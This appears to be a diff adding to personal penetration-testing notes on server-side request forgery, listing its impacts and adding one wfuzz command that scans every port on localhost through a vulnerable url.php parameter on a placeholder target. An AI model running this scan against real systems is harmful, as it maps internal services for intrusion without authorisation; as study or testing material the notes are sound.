@@ -23,3 +23,7 @@
 ### 3: Ability to scale to internal networks
 
 ### 4: Reveal authentication tokens/credentials
+
+# Check for internal services on a machine via SSRF
+
+#### wfuzz -c -z range,1-65535 http://TARGET_IP/url.php?path=127.0.0.1:FUZZ
